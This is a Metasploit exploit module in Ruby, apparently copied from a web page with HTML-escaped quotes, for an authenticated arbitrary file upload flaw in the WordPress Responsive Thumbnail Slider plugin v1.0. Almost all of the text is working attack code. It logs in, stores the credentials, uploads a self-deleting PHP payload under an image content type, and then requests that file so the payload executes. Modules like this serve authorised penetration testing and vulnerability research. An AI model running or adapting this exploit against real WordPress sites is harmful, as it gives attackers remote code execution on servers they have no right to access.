# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::PhpEXE
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "WordPress Responsive Thumbnail Slider Arbitrary File Upload",
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary file upload vulnerability in Responsive Thumbnail Slider
        Plugin v1.0 for WordPress post authentication.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Arash Khazaei&#039;, # EDB PoC
          &#039;Shelby Pace&#039;    # Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;37998&#039; ]
        ],
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;Responsive Thumbnail Slider Plugin v1.0&#039;, { } ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Aug 28 2015",
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base path for WordPress", &#039;/&#039; ]),
        OptString.new(&#039;WPUSERNAME&#039;, [ true, "WordPress Username to authenticate with", &#039;admin&#039; ]),
        OptString.new(&#039;WPPASSWORD&#039;, [ true, "WordPress Password to authenticate with", &#039;&#039; ])
      ])
  end
 
  def check
    # The version regex found in extract_and_check_version does not work for this plugin&#039;s
    # readme.txt, so we build a custom one.
    check_code = check_version || check_plugin_path
    if check_code
      return check_code
    else
      return CheckCode::Safe
    end
  end
 
  def check_version
    plugin_uri = normalize_uri(target_uri.path, &#039;/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt&#039;)
 
    res = send_request_cgi(
      &#039;method&#039;  =>  &#039;GET&#039;,
      &#039;uri&#039;     =>  plugin_uri
    )
 
    if res && res.body && res.body =~ /Version:([\d\.]+)/
      version = Gem::Version.new($1)
      if version <= Gem::Version.new(&#039;1.0&#039;)
        vprint_status("Plugin version found: #{version}")
        return CheckCode::Appears
      end
    end
 
    nil
  end
 
  def check_plugin_path
    plugin_uri = normalize_uri(target_uri.path, &#039;/wp-content/uploads/wp-responsive-images-thumbnail-slider/&#039;)
 
    res = send_request_cgi(
      &#039;method&#039;  =>  &#039;GET&#039;,
      &#039;uri&#039;     =>  plugin_uri
    )
 
    if res && res.code == 200
      vprint_status(&#039;Upload folder for wp-responsive-images-thumbnail-slider detected&#039;)
      return CheckCode::Detected
    end
 
    nil
  end
 
  def login
    return fail_with(Failure::NoAccess, "Unable to log into WordPress") unless auth_cookies
 
    store_valid_credential(user: datastore[&#039;WPUSERNAME&#039;], private: datastore[&#039;WPPASSWORD&#039;], proof: auth_cookies)
 
    print_good("Logged into WordPress with #{datastore[&#039;WPUSERNAME&#039;]}:#{datastore[&#039;WPPASSWORD&#039;]}")
    auth_cookies
  end
 
  def upload_payload(cookies)
    manage_uri = &#039;wp-admin/admin.php?page=responsive_thumbnail_slider_image_management&#039;
    file_payload = get_write_exec_payload(:unlink_self => true)
    file_name = "#{rand_text_alpha(5)}.php"
 
    # attempt to access plugins page
    plugin_res = send_request_cgi(
      &#039;method&#039;  =>  &#039;GET&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, manage_uri),
      &#039;cookie&#039;  =>  cookies
    )
 
    unless plugin_res && plugin_res.body.include?("tmpl-uploader-window")
      fail_with(Failure::NoAccess, "Unable to reach Responsive Thumbnail Slider Plugin Page")
    end
 
    data = Rex::MIME::Message.new
    data.add_part(file_payload, &#039;image/jpeg&#039;, nil, "form-data; name=\"image_name\"; filename=\"#{file_name}\"")
    data.add_part(file_name.split(&#039;.&#039;)[0], nil, nil, "form-data; name=\"imagetitle\"")
    data.add_part(&#039;Save Changes&#039;, nil, nil, "form-data; name=\"btnsave\"")
    post_data = data.to_s
 
    # upload the file
    upload_res = send_request_cgi(
      &#039;method&#039;  =>  &#039;POST&#039;,
      &#039;uri&#039;     =>  normalize_uri(target_uri.path, manage_uri, &#039;&action=addedit&#039;),
      &#039;cookie&#039;  =>  cookies,
      &#039;ctype&#039;   =>  "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;    =>  post_data
    )
 
    page = send_request_cgi(&#039;method&#039; => &#039;GET&#039;, &#039;uri&#039; => normalize_uri(target_uri.path, manage_uri), &#039;cookie&#039; => cookies)
    fail_with(Failure::Unknown, "Unsure of successful upload") unless (upload_res && page && page.body =~ /New\s+image\s+added\s+successfully/)
 
    retrieve_file(page, cookies)
  end
 
  def retrieve_file(res, cookies)
    fname = res.body.scan(/slider\/(.*\.php)/).flatten[0]
    fail_with(Failure::BadConfig, "Couldn&#039;t find file name") if fname.empty? || fname.nil?
    file_uri = normalize_uri(target_uri.path, "wp-content/uploads/wp-responsive-images-thumbnail-slider/#{fname}")
 
    print_good("Successful upload")
    send_request_cgi(
      &#039;uri&#039; => file_uri,
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookies
    )
  end
 
  def exploit
   unless check == CheckCode::Safe
     auth_cookies = login
     upload_payload(auth_cookies)
   end
  end
end

